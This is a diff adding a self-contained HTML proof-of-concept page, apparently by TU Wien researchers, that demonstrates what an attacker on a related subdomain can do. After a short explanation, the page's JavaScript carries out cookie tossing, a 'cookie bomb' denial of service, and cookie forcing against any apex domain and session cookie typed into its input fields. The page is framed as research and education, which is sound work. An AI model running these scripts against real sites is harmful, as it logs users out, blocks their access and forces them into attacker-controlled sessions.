@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Related-domain PoCs</title>
+	<meta name="author" content="Marco Squarcina">
+	<meta name="description" content="Proof of concept attacks to illustrate the capabilities of a related-domain attacker">
+	<link href="https://fonts.googleapis.com/css?family=Major+Mono+Display|Titillium+Web&display=swap" rel="stylesheet">
+
+	<style>
+		html, body {
+			height: 100%;
+			margin: 0;
+			padding: 0;
+			color: #eee;
+			font-family: 'Titillium Web', sans-serif;
+		}
+
+		a, a:active, a:hover, a:enabled {
+			color: inherit;
+			background-color: rgba(255, 255, 255, 0.05);
+			border-radius: 3px;
+			padding: 0.1em 0.2em;
+			text-decoration: underline;
+		}
+
+		a.fab {
+			text-decoration: none;
+			background: none;
+		}
+
+		button {
+			background-color: #5e5e5e;
+			border: none;
+			color: white;
+			padding: 15px 32px;
+			text-align: center;
+			text-decoration: none;
+			display: inline-block;
+			font-family: inherit;
+			font-size: smaller;
+			transition-duration: 0.4s;
+			font-weight: bolder;
+			cursor: pointer;
+		}
+
+		button:hover {
+			background-color: #d94338;
+			box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+
+			color: white;
+		}
+
+		input {
+			padding: 12px 20px;
+			margin: 0 0 1em 0;
+			width: 100%;
+			box-sizing: border-box;
+			font-family: inherit;
+			font-size: inherit;
+			background-color: rgba(255, 255, 255, 0.6);
+			border: 0;
+			transition-duration: 0.4s;
+			color: #666;
+		}
+
+		input:hover {
+			background-color: #fff;
+			box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+			color: #222;
+		}
+
+		input.danger {
+			background-color: #d94338;
+		}
+
+		main,
+		section {
+			position: relative;
+			height: 100%;
+			padding: 0;
+			margin: 0;
+			background: black;
+		}
+
+		section {
+			width: 80%;
+			margin: 0 auto;
+			padding: 0 10%;
+			font-size: 1.2em;
+			line-height: 1.5em;
+			display: table;
+			overflow: scroll;
+		}
+
+		.vertical-center {
+			display: table-cell; vertical-align: middle;
+		}
+
+		section h2 {
+			font-family: 'Major Mono Display', monospace;
+			margin-top: 2em;
+			padding-top: 0;
+			font-size: 1.5em;
+			text-align: left;
+			line-height: 2rem;
+		}
+
+		.btn {
+			float: left;
+			width: 7em;
+		}
+
+		.desc {
+			margin-left: 7em;
+		}
+
+		.atk {
+			clear: both;
+			margin-bottom: 2em;
+		}
+
+		.atk::after {
+			clear: both;
+			content: "";
+			display: table;
+		}
+
+		section button {
+			margin: 0;
+			padding: 0;
+			text-align: center;
+			width: 7em;
+			height: 7em;
+			border-radius: 50%;
+		}
+
+		section p {
+			text-align: justify;
+		}
+
+		@media only screen and (min-width : 768px) {
+			section h2 {
+				font-size: 2em;
+			}
+		}
+		 
+		#sec-intro {
+			background: #0B94C1;
+			animation: background-1 15s infinite;
+		}
+
+		#sec-cookies {
+			background: #0866A5;
+		}
+
+		@keyframes background-1 {
+			0% { background-color: #0B94C1; }
+			20% { background-color: #0866A5; }  
+			40% { background-color: #254189; }
+			60% { background-color: #5C27A6; }
+			80% { background-color: #7D00BC; }
+			100% { background-color: #0B94C1; }
+		}
+  </style>
+</head>
+ 
+<body>
+	<main>
+		<section id="sec-intro">
+			<div class="vertical-center">
+				<h2>Related-domain Attacker PoCs</h2>
+				<p id="apex-domain">Target apex domain, e.g., example.com:<br><input type="text" id="input-apex-domain" value="" placeholder="Target domain"></p>
+				<p>This is a collection of examples to demonstrate the threats posed by a <a href="https://web.archive.org/web/20180513103923/https://www.abortz.net/papers/session-integrity.pdf">related-domain attacker</a>, i.e., an attacker who controls a site on a related domain of the target web site. Related domains are domains that share a sufficiently long suffix that is not present in the <a href="https://publicsuffix.org/">public suffix list</a>. Examples of related domains are www.example.com and sub.domain.of.example.com. As shown below, a related domain attacker can mount a number of attacks resulting in denial of service, session hijacking and session swapping.</p>
+				<p><strong>Terms of usage</strong> This page is created by researchers of the <a href="https://secpriv.wien/">Security &amp; Privacy Research Unity</a> at <a href="https://tuwien.ac.at">TU Wien</a>. Being served as a single file, it can be easily saved and hosted on a subdomain of any organisation for testing and educational purposes. The authors do not assume any responsibility for any damages caused by the usage of the code in this page.</p>
+				<p>Don't hesitate to send us an <a href="mailto:marco.squarcina@tuwien.ac.at">e-mail</a> if you have additional questions.</p>
+			</div>
+		</section>
+
+		<section id="sec-cookies">
+			<div class="vertical-center">
+				<div class="atk">
+					<div class="btn">
+						<button id="atk-cookie-tossing">DoS1</button>
+					</div>
+					<div class="desc">
+						<p><strong>Cookie Tossing</strong> wipes all the cookies stored by a target domain and by all its subdomains. The attack sets 250 non-secure and 250 secure cookies (if possible, <a href="https://datatracker.ietf.org/doc/draft-ietf-httpbis-rfc6265bis/?include_text=1">RFC6265bis</a> mandates that secure cookies cannot be overwritten from non-secure origins) for the target domain, exceeding the maximum number of cookies allowed by the cookie jar for a site and thus removing all the older cookies previously stored. As a result, users are logged out from all the services where they had an active authenticated session.</p>
+					</div>
+				</div>
+				
+				<div class="atk">
+					<div class="btn">
+						<button id="atk-cookie-bomb">DoS2</button>
+					</div>
+					<div class="desc">
+						<p><strong>Cookie Bomb</strong> prevents users from accessing most of the sites hosted on the target domain and its subdomains. The attack sets 10 random cookies of 4KB each. Subsequent requests from the browser to the target's domain are blocked, since most web servers are configured by default to reject requests with a header size larger than 8 or 16KB.</p>
+					</div>
+				</div>
+
+				<div class="atk">
+					<div class="btn">
+						<button id="atk-cookie-forcing">Swap1</button>
+					</div>
+					<div class="desc">
+						<p><strong>Cookie forcing</strong> sets a session cookie in the browser to force users inside the attacker's session. If a session cookie has already been stored in the browser, it's likely that the new cookie will be attached alongside the old one in new requests. Depending on the order in which the browser sends the cookies, the attack will fail if the server discards the newly set cookie.</p>
+						<p>
+							Target cookie name, e.g., PHPSESSID:<br>
+							<input class="secondary" type="text" id="input-target-cookie-name" value="" placeholder="Target cookie name">
+							Target cookie value, e.g., fJJLO8QtJIuEXCHiBNodBbkz:<br>
+							<input class="secondary" type="text" id="input-target-cookie-value" value="" placeholder="Target cookie value">
+							Target cookie path, by default it is set to /:<br>
+							<input class="secondary" type="text" id="input-target-cookie-path" value="/" placeholder="Target cookie path">
+						</p>
+					</div>
+				</div>
+
+				<div class="atk">
+					<div class="btn">
+						<button id="atk-cookie-tossing-forcing">Swap2</button>
+					</div>
+					<div class="desc">
+						<p><strong>Cookie tossing and cookie forcing</strong> first wipes the cookie jar and then performs a cookie forcing attack to overcome the limitations discussed in the previous attack. As discussed in the Cookie Tossing section, this attack will fail if you are trying to replace a secure session cookie from a non-secure origin.</p>
+					</div>
+				</div>
+			</div>
+		</section>
+	</main>
+	<script>
+var apexDomain;
+var targetCookieName;
+var targetCookieValue;
+var targetCookiePath;
+var secureCookieAttribute = location.protocol.startsWith("https") ? "; secure" : "";
+
+function checkApexDomain(callback) {
+	inputApexDomain = document.getElementById("input-apex-domain");
+	apexDomain = inputApexDomain.value;
+	
+	if(apexDomain == "") {
+		inputApexDomain.scrollIntoView({behavior: "smooth", block: "center"});
+		inputApexDomain.classList.add("danger");
+		setTimeout(() => {
+			inputApexDomain.classList.remove("danger");
+		}, 2000);
+	} else {
+		callback();
+	}
+}
+
+function checkTargetCookie(callback) {
+	checkApexDomain(() => {
+		inputTargetCookieName = document.getElementById("input-target-cookie-name");
+		inputTargetCookieValue = document.getElementById("input-target-cookie-value");
+		inputTargetCookiePath = document.getElementById("input-target-cookie-path");
+		targetCookieName = inputTargetCookieName.value;
+		targetCookieValue = inputTargetCookieValue.value;
+		targetCookiePath = inputTargetCookiePath.value;
+
+		if(targetCookieName == "" || targetCookieValue == "" || targetCookiePath == "") {
+			inputTargetCookieName.scrollIntoView({behavior: "smooth", block: "center"});
+			inputTargetCookieName.classList.add("danger");
+			inputTargetCookieValue.classList.add("danger");
+			inputTargetCookiePath.classList.add("danger");
+			setTimeout(() => {
+				inputTargetCookieName.classList.remove("danger");
+				inputTargetCookieValue.classList.remove("danger");
+				inputTargetCookiePath.classList.remove("danger");
+			}, 2000);
+		} else {
+			callback();
+		}
+	});
+}
+
+function atkCookieTossing() {
+	console.log("[*] Executing cookie tossing attack");
+	let i;
+	for(i=0; i<500; i++) {
+		if(i%2 == 0) {
+			if(secureCookieAttribute != "") {
+				document.cookie = "c" + i + "=v; domain=" + apexDomain + secureCookieAttribute;
+			}
+		} else {
+			document.cookie = "c" + i + "=v; domain=" + apexDomain;
+		}
+	}
+	console.log("[*] Cookie jar\n" + document.cookie);
+}
+
+function atkCookieBomb() {
+	console.log("[*] Executing cookie bomb attack");
+	let i;
+	for(i=0; i<10; i++) {
+    	document.cookie = "c" + i + "=" + "A".repeat(4000) 
+    		+ "; path=/; domain=" + apexDomain;
+	}
+	console.log("[*] Cookie jar\n" + document.cookie);
+}
+
+function atkCookieForcing() {
+	console.log("[*] Executing cookie forcing attack on cookie " + targetCookieName);
+	document.cookie = targetCookieName + "=" + targetCookieValue + "; path=" + targetCookiePath 
+		+ "; domain=" + apexDomain + secureCookieAttribute;
+	console.log("[*] Cookie jar\n" + document.cookie);
+}
+
+function atkCookieTossingForcing() {
+	console.log("[*] Executing cookie tossing and cookie forcing attack");
+	atkCookieTossing();
+	atkCookieForcing();
+	console.log("[*] Cookie jar\n" + document.cookie);
+}
+
+document.getElementById("atk-cookie-tossing").addEventListener("click", () => { checkApexDomain(atkCookieTossing); });
+document.getElementById("atk-cookie-bomb").addEventListener("click", () => { checkApexDomain(atkCookieBomb); });
+document.getElementById("atk-cookie-forcing").addEventListener("click", () => { checkTargetCookie(atkCookieForcing); });
+document.getElementById("atk-cookie-tossing-forcing").addEventListener("click", () => { checkTargetCookie(atkCookieTossingForcing); });
+	</script>
+</body>
+</html>
